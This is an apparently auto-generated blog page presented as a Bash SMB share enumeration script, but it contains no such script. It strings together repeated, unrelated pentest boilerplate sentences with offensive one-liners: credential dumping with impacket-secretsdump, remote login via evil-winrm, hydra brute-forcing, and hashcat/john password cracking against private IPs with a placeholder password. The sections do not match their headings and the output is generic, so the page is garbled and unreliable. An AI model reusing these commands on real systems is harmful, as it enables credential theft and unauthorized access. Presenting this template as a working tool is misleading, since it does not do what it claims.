---
TitleSEO: "SMB Share Enumeration Script in Bash | ZureFX"
TitlePost: "SMB Share Enumeration Script — Bash"
Author: "ZureFX"
Description: "A Bash script for smb share enumeration script. Built for security research and automation."
Keywords: "c, automation, python, bash"
URL: "https://zurefx.github.io/scripting/script-smb-share-enumeration-script-200.html"
URL_IMAGES: ""
Date: "2025-05-25"
Tags: "C, Automation, Python, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-smb-share-enumeration-script-200"
Permalink: "/scripting/script-smb-share-enumeration-script-200.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Group Policy Preferences contained encrypted but recoverable credentials. The target system was identified as running a vulnerable version of the service. Initial enumeration revealed several interesting open ports on the target.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `feroxbuster`
- `nmap`
- `mimikatz`

## Implementation

### Core Logic

Group Policy Preferences contained encrypted but recoverable credentials. Command injection was possible through unsanitized user input in the search functionality.

```bash
crackmapexec smb 10.106.82.3 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Unconstrained delegation was enabled on the compromised machine. The service was running without proper input validation, leading to injection vulnerabilities.

### Helper Functions

Token impersonation allowed elevation to SYSTEM privileges on the target. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.126.232.23
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.98.59.197 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
```

## Usage

### Basic Usage

Command injection was possible through unsanitized user input in the search functionality. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.108.174.186
evil-winrm -i 10.111.95.84 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
```

### Advanced Options

Weak file permissions allowed modification of critical system files. Group Policy Preferences contained encrypted but recoverable credentials. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## Output

### Example Output

Unconstrained delegation was enabled on the compromised machine. Token impersonation allowed elevation to SYSTEM privileges on the target.

```
[+] Scanning target...
[+] Found 20 results
[+] Done in 3.63s
```
